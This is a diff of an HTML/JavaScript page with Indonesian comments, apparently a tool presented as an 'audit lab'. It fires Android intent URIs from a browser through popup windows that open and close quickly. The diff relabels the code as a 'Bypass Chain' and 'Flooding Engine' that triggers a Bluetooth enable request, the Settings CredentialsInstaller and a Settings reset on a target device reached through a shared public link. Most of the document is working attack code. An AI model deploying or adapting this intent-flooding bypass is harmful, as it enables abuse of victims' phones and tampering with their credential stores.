@@ -39,13 +39,13 @@
 
 <div class="panel">
     <h3> Host Control Interface (HP-A)</h3>
-    <p>Salin tautan ini di perangkat penguji untuk disebarkan ke perangkat target:</p>
+    <p>Salin tautan penyebaran muatan publik ini dari perangkat penguji:</p>
     <button id="copy-deploy-link">Copy Public Deployment Link</button>
 </div>
 
 <div class="panel">
     <h3> Target Audit Interface (HP-B)</h3>
-    <p>Ketuk tombol eksekusi untuk menguji ketahanan bypass multi-konteks pada peramban target:</p>
+    <p>Ketuk untuk menguji ketahanan bypass multi-konteks terhadap kondisi Intent Flooding pada perangkat target:</p>
     <button id="launch-hardened-pipeline">Execute Hardened Bypass Chain</button>
 </div>
 
@@ -70,29 +70,28 @@ function buildIntentUri(action, component = '', extras = {}) {
     });
     
     // FLAG_ACTIVITY_NEW_TASK (0x10000000) & FLAG_ACTIVITY_MULTIPLE_TASK (0x08000000)
-    // Menjamin pembuatan task baru secara independen di sistem operasi Android
+    // Memaksa subsystem Android membuat instansi jendela baru secara independen
     uri += `launchFlags=0x18000000;category=android.intent.category.DEFAULT;end`;
     return uri;
 }
 
-// STRATEGI PENGUATAN: Eksekusi Multi-Konteks (Bypass Sandbox Filter)
+// STRATEGI BYPASS: Distribusi Sub-Konteks Asinkron (Multi-Tab Spawning)
 function dispatchHardenedNode(uri, label) {
     try {
-        // Membuat sub-konteks jendela terisolasi secara asinkron
+        // Membuka tab kosong baru sebagai wadah isolasi muatan
         const subWindow = window.open("about:blank", "_blank");
         
         if (subWindow) {
-            // Mengalihkan lokasi sub-window langsung ke URI Intent
             subWindow.location.href = uri;
             
-            // Menutup sub-konteks segera untuk membersihkan tumpukan tab browser
+            // Menutup tab konseptual segera setelah intent dilempar ke sistem router
             setTimeout(() => {
-                subWindow.close();
-            }, 100);
+                try { subWindow.close(); } catch(e){}
+            }, 200);
             
-            writeLog(label, 'target', `Muatan berhasil dipisahkan ke dalam sub-konteks jendela baru.`);
+            writeLog(label, 'target', `Muatan sukses dipisahkan ke dalam sub-konteks jendela baru.`);
         } else {
-            // Metode cadangan jika deteksi pop-up aktif
+            // Mekanisme Fallback jika filter pop-up browser aktif
             const anchor = document.createElement("a");
             anchor.href = uri;
             anchor.target = "_blank";
@@ -114,18 +113,18 @@ document.getElementById("copy-deploy-link").addEventListener("click", () => {
     });
 });
 
-// Eksekusi berkecepatan tinggi dengan pemisahan konteks window
+// Pipa Eksekusi Berkecepatan Tinggi (Flooding Engine)
 document.getElementById("launch-hardened-pipeline").addEventListener("click", () => {
     writeLog('TARGET_INIT', 'target', "Memicu Asynchronous Window Spawning Pipeline...");
 
-    // Tahap 1: Meminta dialog sistem konfirmasi Bluetooth
+    // Tahap 1: Memanggil dialog sistem permintaan status perangkat keras (Bluetooth Request)
     const uri1 = buildIntentUri(
         "android.bluetooth.adapter.action.REQUEST_ENABLE",
         "com.android.settings/.bluetooth.RequestEnableActivity"
     );
     dispatchHardenedNode(uri1, 'STAGE-1');
 
-    // Tahap 2: Meneruskan data parameter ekstra ke komponen CredentialsInstaller internal
+    // Tahap 2: Pengiriman argumen parameter tambahan ke CredentialsInstaller internal
     const uri2 = buildIntentUri(
         "android.intent.action.VIEW",
         "com.android.settings/.crypto.CredentialsInstaller",
@@ -136,11 +135,11 @@ document.getElementById("launch-hardened-pipeline").addEventListener("click", ()
     );
     dispatchHardenedNode(uri2, 'STAGE-2');
 
-    // Tahap 3: Penyegaran paksa ke Pengaturan Utama
+    // Tahap 3: Pembersihan tumpukan jendela aktivitas luar (Reset State)
     const uri3 = buildIntentUri("android.settings.SETTINGS");
     dispatchHardenedNode(uri3, 'STAGE-3');
 
-    writeLog('TARGET_FINISH', 'target', "Semua sub-konteks muatan dilepaskan secara paralel.");
+    writeLog('TARGET_FINISH', 'target', "Seluruh sub-konteks muatan diproses secara paralel oleh subsystem OS.");
 });
 
 writeLog('SYSTEM', 'target', "Laboratorium taktis berbasis asinkron siap.");
